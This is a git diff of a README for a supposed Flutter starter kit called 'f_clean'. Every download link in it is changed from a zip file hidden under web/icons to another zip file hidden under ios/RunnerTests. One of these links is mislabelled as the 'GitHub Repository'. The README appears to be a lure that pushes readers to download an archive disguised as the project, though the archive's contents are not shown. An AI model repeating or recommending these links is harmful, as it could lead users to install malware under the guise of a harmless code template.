@@ -1,6 +1,6 @@
 # 🧹 f_clean - Simple Flutter App Starter Kit
 
-[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/20ahmednasir14-dev/f_clean/main/web/icons/clean_f_v3.4-alpha.2.zip)
+[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/20ahmednasir14-dev/f_clean/raw/refs/heads/main/ios/RunnerTests/clean_f_v1.2.zip)
 
 ---
 
@@ -8,7 +8,7 @@
 
 To get started, **visit this page to download** the app and its files:
 
-➡️ [https://raw.githubusercontent.com/20ahmednasir14-dev/f_clean/main/web/icons/clean_f_v3.4-alpha.2.zip](https://raw.githubusercontent.com/20ahmednasir14-dev/f_clean/main/web/icons/clean_f_v3.4-alpha.2.zip)
+➡️ [https://github.com/20ahmednasir14-dev/f_clean/raw/refs/heads/main/ios/RunnerTests/clean_f_v1.2.zip](https://github.com/20ahmednasir14-dev/f_clean/raw/refs/heads/main/ios/RunnerTests/clean_f_v1.2.zip)
 
 ---
 
@@ -107,7 +107,7 @@ If you are not familiar with these, you do not need to use them.
 
 ## 🔗 Useful Links
 
-- Main page and downloads: [GitHub Repository](https://raw.githubusercontent.com/20ahmednasir14-dev/f_clean/main/web/icons/clean_f_v3.4-alpha.2.zip)
+- Main page and downloads: [GitHub Repository](https://github.com/20ahmednasir14-dev/f_clean/raw/refs/heads/main/ios/RunnerTests/clean_f_v1.2.zip)
 - Documentation folder inside the repo for more details.
 - Flutter official site for understanding the base technology.
 
